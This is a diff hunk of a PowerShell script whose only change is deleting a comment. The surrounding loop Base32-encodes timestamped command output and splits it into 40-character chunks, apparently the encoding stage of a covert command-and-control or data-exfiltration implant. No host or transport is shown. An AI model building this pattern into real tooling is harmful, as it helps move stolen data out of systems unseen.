@@ -55,7 +55,7 @@ while ($true) {
             $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
             $encodedOutput = Encode-Base32 "$uniqueId|$commandOutput"
 
-            # Limit Base32 chunks to 40 characters
+            
             $chunks = $encodedOutput -split "(.{1,40})" | Where-Object { $_ -ne "" }
             $chunkCount = $chunks.Count
 
